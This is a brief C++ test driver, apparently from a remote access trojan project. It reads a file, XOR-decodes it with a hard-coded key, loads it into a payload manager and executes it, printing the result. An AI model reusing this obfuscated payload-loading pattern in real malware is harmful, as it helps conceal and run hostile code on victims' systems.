#include "logging.hpp"
#include "rat/payload/PayloadManager.hpp"
#include "rat/encryption/encryption.hpp"
#include "rat/system.hpp"

#include <fmt/core.h>

using namespace rat::payload;


const std::string key = "ABCDE";
int main(void) {
    PayloadManager payload_manager(key);
    std::vector<uint8_t> file_buffer;
    if(rat::system::readBytesFromFile("hello_world", file_buffer) ) {
        DEBUG_LOG("Buffer Read");
    }
    rat::encryption::xorData(file_buffer.data(), file_buffer.size(), key.c_str());
        DEBUG_LOG("Data XORed");
    payload_manager.load("hello", file_buffer);
    std::string response_buffer;
    if(payload_manager.execute("hello", {}, response_buffer)) {
      DEBUG_LOG("Execution complete");
      std::cout << response_buffer;

    }
    return 0;
}
